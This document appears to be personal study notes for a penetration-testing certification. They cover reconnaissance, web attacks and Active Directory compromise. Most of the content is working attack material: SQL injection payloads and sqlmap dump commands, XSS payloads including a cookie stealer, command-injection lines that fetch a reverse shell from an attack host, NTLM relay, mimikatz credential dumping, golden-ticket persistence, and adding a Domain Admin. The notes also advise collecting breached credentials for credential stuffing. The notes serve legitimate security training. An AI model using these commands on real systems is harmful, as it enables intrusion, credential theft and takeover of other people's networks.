# CJPT

## Resources
[Instructor Gitbook](https://appsecexplained.gitbook.io)

## Information Gathering (Recon)
### Passive Recon
Location Information  
Satellite images, Drone Recon, Building Layout (Badge Readers, break areas, security, fencing)

Job Information  
Employees (name, job title, phone number, manager, etc.)  
Pictures (Badge photos, desk photos, computer photos, etc.)  

Web/Host
  1. Target Validation - Whois, nslookup,dnsrecon
  2. Finding Subdomains - Google, dig, nmap, Sublist3r, Bluto, crt.sh, etc.
  3. Fingerprinting - nmap, Wappalyzer, whatweb, BuiltWith, Netcat
  4. Data Breaches - HaveIBeenPwned, Breach-Parse, WeLeakInfo

### Discovering Email Addresses  
  
[Hunter.io](https://hunter.io) - 50-100 Free Searches per month.  
[Phonebook.cz](https://phonebook.cz) - More of just an email dump. (Great for exporting for credential stuffing)  
Clearbit Connect - Chrome Extension (Allows searching by role, ie: IT, CEO, CTO, CISO, etc.)  
[Email Hippo](https://tools.verifyemailaddress.io) - Verify Email Addresses  
[email-checker.net](https://email-checker.net/validate) - Verify Email Addresses (Has an API)

  1. Be sure to check for email patterns and departments  
  2. Use forgot password functionality in websites to verify usernames  

### Breached Credentials
[Breach Parse](https://github.com/hmaverickadams/breach-parse.git) - Will require torrent download of Data (Approx. 44 GB Extracted)  

[dehashed](https://dehashed.com) - Not free
  1. Multiple search options. Can search by email, ip, password, etc;  
  2. 

Use breached credentials to not only use for password stuffing, but also for tying together disparate datapoints to get a clear picture of the user you are going to be attacking or for determining a user easier to attack.

### Hunting Subdomains
Certificate Fingerprinting
[crt.sh](https://crt.sh) - Uses Cert registrations to find subdomains (% is the wildcard)  

[Sublist3r](https://github.com/aboul3la/Sublist3r)  
Install
```bash
sudo apt install sublist3r
```
Usage
```bash
sublist3r -d <domain>
```
[Owasp Amass](https://github.com/owasp-amass/amass)  

[Tomnomnom](https://github.com/tomnomnom/httprobe) - Probes a list and will determine if website is alive or not.  

### Identifying Website Tech
Identify the technologes in use on a website  
[Builtwith.com](https://builtwith.com)  - Used to identify the tech stack of public websites  
[Wappalyzer](https://www.wappalyzer.com/) - Browser plugin + web  
[whatweb](https://github.com/urbanadventurer/WhatWeb) - Linux Command Line  
Whatweb Usage:
```bash
whatweb https://<domain>
```

### Google FU
[Search Tags](https://ahrefs.com/blog/google-advanced-search-operators/):    
site:  
filetype:  
inurl:  

### Social Media
  1. Look for interesting stuff in photo's (Badge Photo's, Screens, Desks, software, etc)  
  2. Look at the people (Email Addresses, names, nicknames, positions, etc)  
  3. Best Sites:  
   1. [Linkedin.com](https://linkedin.com)  
   2. [x.com](https://x.com)  
*** Special Note: Use a burner account. linkedin users can see who's looked at their profile ***

## Scanning & Enumeration
### Nmap
See separate notes in Hacktools  
### HTTP/S Enumeration
View the website. Look for any obvious flaws. Get what tech it's using if you haven't already.  
Default web pages are an automatic finding (Usually because they divulge OS/Service info, is there another directory behind it? Were they just sloppy with their install?)  
Look for information disclosures in error pages (Service Version, hostname, naming conventions, etc)  
View Source code: Looking for keys, accounts, tech stack, passwords, etc;    

[Nikto](https://github.com/sullo/nikto) - Web Vulnerability Scanner  
Usage:
```bash
nikto -h <URL>
```
Potential Findings: Outdated software, possible code execution, vulnerabilities, etc.  

[GoBuster](https://github.com/OJ/gobuster)  
***Note: TCM recommends dirbuster, however, dirbuster has not been maintained, I've included the equivalent commands for GoBuster***
Directory Scan
```bash
gobuster dir -u <url> -w <wordlist> -x <file extension>
```
### SMB Enumeration
* Used for files shares, etc
> Usually low hanging fruit. Be sure to look for the version

* SMBClient - Connect to the share and explore any available files
```bash
# List Shares
smbclient -L \\\\<IP>\\

# Connect to a share
smbclient \\\\<IP>\\<SHARE>
```

* Metasploit
Search auxiliary scripts for version ID
```bash
msf5> auxiliary/scanner/smb/smb_version
```

### SSH
* Document version from nmap and check for vulnerabilities
* Try to connect and see if it gives any info
```bash
ssh <IP> -oKexAlgorithms=+ <Algorithm> -c <cypher>
```

## Find/Exploit Common Web vulnerabilities
### SQL Injection
#### Union [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
> Useful for search fields
* Finding vulnerable fields  
Throw special characters at it and see if it breaks  
  Double quotes, single quotes, colon, pound sign

Find a search that generates a result, and add:  
  `' or 1=1#` - 1=1 should always evaluate to true, thus returning all of the entries in the db   
  Also, try playing with variations, such as `' or '1'='1`  
> The `union` statement allows us to pull data from other tables and columns that were not initially defined  
>   * Caveat: We can only select as many columns as in the original query, so we're going to have to find that out  

- Basically, we're are going to keep adding null selects to the query until the query works
  ```SQL
  <working query>' union select null,null,null#
  ```
- We can grab info from the query, such as table names, version info, etc.
  Table names
  ```SQL
  <working query>' union select null,null,table_name from information_schema.tables#
  ```
  Column names
  ```SQL
  <working query>' union select null,null,column_name from information_schema.columns#
  ```
  DB Version
  ```SQL
  <working query>' union select null,null,version()#
  ```
#### Blind Injection
Blind injection isn't going to return anything you can see on the screen, you are going to have to capture it somewhere else.  
> Remember you provide to the application is injectable. Post variables, sessions cookies, User-Agent, all injectable
- Use Burp to compare the size of the response to a successful response vs a failed response.
- Testing the post paramters
  * add `'or 1=1` or `and 1=1` (or some variation) to each parameter to see if they are successful
  * Subsring matches  
    Substring matching is basically asking the DB true or false questions. True being if the query works, and false being if it fails
    ```SQL
    <working payload> and substring(query,first char position,char length) = '<comparison value'

    # Example (If we were running version 8.0.5, this evaulate as true)
    Cookie: session=<session cookie>' and substring ((select version()), 1, 5) = '8.0.5'#
    ```
    * This is going to be very time consuming to do manually
- SQLMap
  * copy the entire post request to a .txt file
  * Run a basic SQLMap injection test  
  ```bash
  sqlmap -r <req.txt>
  ```
  * Run Advanced SQLMap injection tests
  ```bash
  sqlmap -r req2.txt --level=2 # --level=2 tests more parameters
  ```
  * SQLMap to dump items once injection is found
  ```bash
  # Dump an entire table
  sqlmap -r req2.txt --level=2 --dump -T <table name>

  # Dump the entire db 
  sqlmap -r req2.txt --level=2 --dump

  # Dump a list of tables
  sqlmap -r req2.txt --level=2 --tables
  ```
### XSS
#### DOM Based
  Check the network tab for a request that goes back to the server. If there isn't one, everything's being done in the DOM  
* Identification  
    - Sample Payloads

        ```javascript
         # Useful if the page reloads after submission
         <script>prompt()</script> # Should pop a prompt
         <script>print()</script> # Shoudl open the print dialog

         # if the page doesn't reload, you're going to have to find a way to trigger the payload
         <img src="" onerror="prompt(1)">

         # Forward the user to a different location (hint: such as a web server controlled by you with a payload)
         <img src=x onerror="window.location.href='http://<URL>'">
        ```
#### Stored XSS
Stored XSS sends data back to the server. XSS payloads will be visible to other users.
* Identification
    - Test for HTML injection first
    ```HTML
    <h1>test</h1>
    ```
    - Some javascript payloads
    ```javascript
    <script>prompt(1)</script>
    <script>print(1)</script>
    <script>alert(document.cookie)</script>
    ```
    - Cookie Stealer
    ```javascript
    <script>var i = new Image; i.src="URL/?"+document.cookie;</script>
    ```
### Command Injection
> Violates separation of data and code. Look for `eval()` Basically the browser is executing code on the system provided by the user
> Command injection is great for shells. Try and use full paths to binaries. Use common ports to evade suspicion
* Identification
    - Look for some function on the page that executes a system command. (ping, curl, tracert,etc)
* Basic Payloads
    ```
    # Basic command separators (; && # , etc)
    ; cat /etc/passwd
    ; ls -la
    ```
* Advanced Payloads
    [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

#### Blind Command Injection(Out of Band)
> You will not be able to see the results of your command. You may just get an "ok" or a true/false
> Will need to try out-of-band techniques, ie calling a website
* Payload operators 
```bash
\n # New Line
`` # Enclosing your command in backticks
$$ # Command Separator 
#  # End of line
```
* Sample Payloads
```
# Same Reverse shell
https://<anywebsite>/ && curl http://<attack host>/rev.php > /var/www/html/rev.php

# Sample Reverse Shell 2 
http://<anywebsite>/ \n wget http://<attack host>/rev.php > /var/www/html/rev.php
```
* Advanced Payloads
    [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

### Attacking Authentication
* with ffuf
  ```bash
  # RepLace the username/password in your req.txt with 'FUZZ'
  ffuf -request <req.txt> -w <wordlist>

  #Use custom 'FUZZ' keywords if you need to fuzz multiple fields
  ffuf -request <req.txt> -request-proto http -mode clusterbomb -w <pass.txt>:FUZZPASS -w <users.txt>:FUZZUSER -fs <filesize>
  ```
#### Attacking Authentication w/ MFA
> MFA can be brute forced the same way as basic auth w/ ffuf or burp

* with Burp Suite
  Try replacing the username in the MFA Post request to the target user

### XXE
> Useful on web applications that use xml entities (data represented as xml)
> Anywhere you can pass or upload xml, test for injection

[Best Payloads](https://payhttps://swisskyrepo.github.io/InternalAllTheThings)

### IDOR (Insecure Direct Object Reference)
> BOLA=IDOR
> find a point where you can manipulate an object ID, and change it

* Fuzzing ID's w/ ffuf
  ```bash
  ffuf -u 'URL' -w <wordlist> -fs <response size>
  ```

## AD Initial Attack Vectors
### LLMNR Poisoning w/ Responder

  * Captures hashes w/ Responder
    ```bash
    sudo Responder -I <iface> -dwPv

    # Verify that all of the Poisoners/Servers are on
    ```
  * Crack the hashes w/ Hashcat
    ```bash
    # Make sure to copy the entire hash, including username and domain
    hashcat -a 0 -m 5600 <hashes file> <wordlist> -O

    # Show the hashes from that run that have already been cracked
    hashcat -a 0 -m 5600 <hashes file> <wordlist> --show

    # Running hashcat with a rule
    hashcat -a 0 -m 5600 <hashes file> <wordlist> -r OneRule
    ```
### SMB Relay 
  * Requirements
    - SMB Signing must be disabled or not enforced on the target
    - Relayed user credentials must be admin on machine for any real value
  * Detection
    ```bash
    nmap --script=smb2-security-mode.nse -p 445 <target ip>

    #nmap scan the network
    nmap --script=smb2-security-mode.nse -p 445 <Network/CIDR> -Pn | grep not
    ```
  * Attack
    - Change responder config.
      - Turn off SMB and HTTB
      ```bash
      sudo vim /etc/responder/Responder.conf
      ```
    - Run Responder
    ```bash
    sudo responder -I <iface> -dwP
    ```
    - Run ntlmrelayx.py (Impacket-ntlmrelayx)
    ```bash
    ntlmrelax.py -tf <targets txt> -smb2support
    ```
    - If the attack is successful, ntlmrelayx will dump the SAM and drop us into a shell

### Shell Access
  * PSExec in Metasploit
  * psexec.py (Impacket)
    ```bash
    # with password
    psexec.py <domain/user>:<password>@<ip>

    # with hash
    psexec.py <user>@<ip> -hashes <LM:NT>
    ```
  * wmiexec.py
    Same options as psexec
  * smbexec.py
    Same options as psexec

### IPv6 Attacks
  * MITM6  
    :warning: this will cause network issues if run for longer than 5 or 10 minutes
    ```bash
    sudo mitm6 -d <domain>
    ```
    ```bash
    ntlmrelayx.py -6 -t ldaps://<ip> -wh fakewpad.<domain> -l <loot folder>
    ```
### Passback Attack
  * [Printers](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)

## Initial Internal Attack Strategery
  * Begin day with mitm6 or Responder
  * Run Scans to generate traffic
  * Look for websites in scope
  * Look for default credentials on web longs
    - Printers
    - Jenkins
    - etc
  * Think outside the box

## Post-Compromise Enumeration
### Strategery
  - We have an account, now what?
  - Search for the quick wins
    * Kerberoasting
    * Secretsdump
    * Pass the hash/Pass the password
  - No quick wins? dig deep!
    * Enumerate (Bloodhound, etc)
    * Where does our account have access?
    * Old Vulnerabilities die hard
  - Think outside the box
### ldapdomaindump
  * Usage
    ```bash
    sudo ldampdomaindump ldaps://<IP> -u <domain>\<user> -p <password>
    ```
### Bloodhound
  * Usage
    ```bash
    sudo bloodhound-python -d <domain> -u <username> -p <password> -ns <nameserver IP> -c all
    ```
## Post-Compromise Attacks
### Pass the Password
  * Crackmapexec/nxc
    > Basically, we are going to see what machines we can access over the network  
    ```bash
    nxc smb <network/cidr> -u <username> -p/-H <password/NTLM hash>
    ```
  * nxc with local auth
    ```bash
    nxc smb <network/cidr> -u <username> -p/-H <password/NTLM hash> --local-auth
    ```
  * nxc w/ lsassy
    ```bash
    # Useful for drive-by dumping of lsass credentials
    nxc smb <network/cidr> -u <username> -p/-H <password/NTLM hash> --local-auth -M lsassy
    ```
  * nxc Dump Sam
    ```bash
    nxc smb <network/cidr> -u <username> -p/-H <password/NTLMv1 hash> --local-auth --sam
    ```
  * nxc Dump LSA
    ```bash
    nxc smb <network/cidr> -u <username> -p/-H <password/NTLMv1> --local-auth --lsa
    ```
    Also dumps out in secretsdump
    Look for DCC (Domain Cached Credentials) for cracking
  * nxc database
    ```bash
    nxcdb
    ```
### Kerberoasting
  * GetUserSPNs.py
    ```bash
    sudo GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC IP> -request
    ```
### Token Impersonation
  * Impersonate Token
    ```bash
    # From msfconsole meterpreter session
    load incognito
    list_tokens -u
    impersonate_token <domain>\\<user> # 2 slashes to escape the 2nd slash
    ```
    ```bash
    # Add a user after impersonation
    net user /add <username> <password> /domain
    # Add our new user to Domain Admins
    net group "Domain Admins" <user> /ADD /DOMAIN
    ```
  * Delegate Token
### LNK File Attack
  * with Powershell (Tries to resolve a png image back to attacker machine)
    ```powershell
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("C:\test.lnk") #Add an ampersand or a tilde to move this to the top of the list in explorer
    $lnk.TargetPath = "\\192.168.138.149\@test.png" #Change to address of attack machine running responder
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Test"
    $lnk.HotKey = "Ctrl+Alt+T"
    $lnk.Save()
    ```
  * Automated with nxc
    ```bash
    nxc smb <victim host> -d <domain> -u <username> -p <password> -M slinky -o NAME=<filename> SERVER=<attack host>
    ```
### GPP/cPassword
> Group Policy Preferences allowed admins to create group policies using embedded credentials. The encryption key for these credentials was accidentally released..
This was patched in MS14-025, but the patch didn't disable previous instances, so they may still be around.  

  * Metasploit  
    msfconsole has a module for this, just seach for gpp
  * gpp-decrypt  
    If you find the cred's manually, you can use gpp-decrypt to decrypt the "cpassword=<blob/blob>"

### Mimikatz
  ```cmd
  mimikatz.exe
  mimikatz > privilege::debug
  mimikatz > sekurlsa::logonPasswords
  ```
## Post-Compromise (We own the domain)
### Strategery
  - Provide as much value to the client as possible
    * Try a different attack path
    * Crack all of the passwords
    * Enumerate shares for sensitive info
  - Persistence
    * What happens if our Domain account access i slost
    * Can we create persistence without being noticed (account creation, etc)
    * Create a Golden Ticket
  - Smoke a cigar and enjoy a couple of fingers of good scotch
### Dump NTDS.dit
  * Secretsdump.py
    ```bash
    secretsdump.py <domain>/<user>:'<password>'@<ip> -just-dc-ntlm
    ```
### Golden Ticket (Persistence)
  > compromised krbtgt account. Allows us to grant tickets however we want. Can access any resource or system on the domain  

  * Mimikatz
    * We need the krbtgt hash and the domain SID
    ```cmd
    mimikatz.exe
    privilege::debug
    lsadump::lsa /inject /name:krbtgt
    # copy ntlm hash and domain sid
    kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<krbtgt hash> /id:500 /ptt
    # /User does not have to be a real user
    misc::cmd # Opens a cmd shell with the Golden Ticket
    ```
  * Additional mimikatz commands to exploit golden ticket
    ```cmd
    # export to .kirbi
    kerberos::golden /User:Administrator /domain: <domain> /sid: <domain sid> /krbtgt: <krbtgt hash> /id: 500 /ticket
    ```
    ```bash
    # convert kirbi to ccache for use on linux with impacket
    ticketConverter.py ticket.kirbi ticket.ccache

    # convert with keko
    kekeo::misc::convert ccache ticket.kirbi
    ```
